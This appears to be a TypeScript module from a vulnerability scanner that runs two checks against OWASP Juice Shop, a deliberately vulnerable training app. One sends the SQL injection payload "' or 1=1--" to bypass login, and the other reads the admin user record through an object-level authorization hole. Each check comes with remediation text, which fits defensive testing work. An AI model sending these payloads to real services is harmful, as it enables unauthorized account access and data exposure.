import { CheckResult } from '../../scanner/checks';
import { JuiceShopAdapter } from './adapter';

type JsCheck = (ctx: { js: JuiceShopAdapter }) => Promise<CheckResult>;

function base(partial: Omit<CheckResult, 'outcome' | 'summary' | 'request' | 'response'>): Omit<CheckResult, 'outcome' | 'summary' | 'request' | 'response'> {
  return partial;
}

// Both of the following are real, independently-confirmed Juice Shop behaviors (OWASP's own
// "challenges" for this app), not guessed — see docs/SECOND-TARGET.md for the raw curl evidence
// each one was verified with before this code was written.

const checkSqliLoginBypass: JsCheck = async ({ js }) => {
  const meta = base({
    vulnKey: 'JS-001', title: 'SQL Injection Login Bypass', type: 'SQL Injection', severity: 'critical',
    cwe: 'CWE-89', owasp: 'A03:2021', endpoint: '/rest/user/login', method: 'POST',
    description: 'The login endpoint builds its lookup query directly from the submitted email, so an injected OR-clause (\' or 1=1--) matches the first row in the table regardless of password.',
    impact: 'An attacker can log in as any user — the first row returned is typically the admin account — without knowing any password.',
    remediation: 'Use parameterized queries / an ORM that never interpolates user input into SQL, and verify the password hash matches before issuing a token.',
  });
  const res = await js.request('POST', '/rest/user/login', { body: { email: "' or 1=1--", password: 'x' } });
  const token = (res.data as { authentication?: { token?: string; umail?: string } })?.authentication;
  const vulnerable = res.status === 200 && Boolean(token?.token);
  return {
    ...meta,
    outcome: vulnerable ? 'VULNERABLE' : 'NOT_VULNERABLE',
    summary: vulnerable ? `Login bypass succeeded, authenticated as ${token?.umail ?? 'unknown'} without a password.` : `Bypass rejected (status=${res.status}).`,
    request: { call: "POST /rest/user/login", body: { email: "' or 1=1--", password: 'x' } },
    response: { status: res.status, authenticatedAs: token?.umail },
  };
};

const checkIdorUserRead: JsCheck = async ({ js }) => {
  const meta = base({
    vulnKey: 'JS-002', title: 'Broken Object Level Authorization (User Records)', type: 'IDOR/BOLA', severity: 'high',
    cwe: 'CWE-639', owasp: 'API1:2023', endpoint: '/api/Users/:id', method: 'GET',
    description: 'GET /api/Users/:id returns any user record (including the admin account) to any authenticated caller, regardless of whose token is used.',
    impact: 'Any registered user can enumerate every other account, including the admin account\'s email and role.',
    remediation: 'Require the requested id to match the authenticated user\'s own id (or an admin role) before returning the record.',
  });
  const { token, email } = await js.demoLogin();
  const own = await js.request('GET', '/rest/user/whoami', { token });
  const admin = await js.request('GET', '/api/Users/1', { token });
  const adminEmail = (admin.data as { data?: { email?: string; role?: string } })?.data;
  const vulnerable = admin.status === 200 && adminEmail?.role === 'admin';
  return {
    ...meta,
    outcome: vulnerable ? 'VULNERABLE' : 'NOT_VULNERABLE',
    summary: vulnerable ? `Logged in as ${email}, read admin account (id=1, ${adminEmail?.email}) with no ownership check.` : `Access blocked (status=${admin.status}).`,
    request: { call: 'GET /api/Users/1', authAs: email },
    response: { ownWhoamiStatus: own.status, adminReadStatus: admin.status, adminRecord: adminEmail },
  };
};

export const JUICESHOP_CHECKS: JsCheck[] = [checkSqliLoginBypass, checkIdorUserRead];

export async function runJuiceShopChecks(js: JuiceShopAdapter): Promise<CheckResult[]> {
  const results: CheckResult[] = [];
  for (const check of JUICESHOP_CHECKS) {
    try {
      results.push(await check({ js }));
    } catch (err) {
      results.push({
        vulnKey: 'UNKNOWN', title: 'Check failed', type: 'ERROR', severity: 'low', cwe: '', owasp: '',
        endpoint: '', method: '', outcome: 'ERROR', summary: err instanceof Error ? err.message : 'Unexpected error',
        description: '', impact: '', remediation: '', request: {}, response: {},
      });
    }
  }
  return results;
}
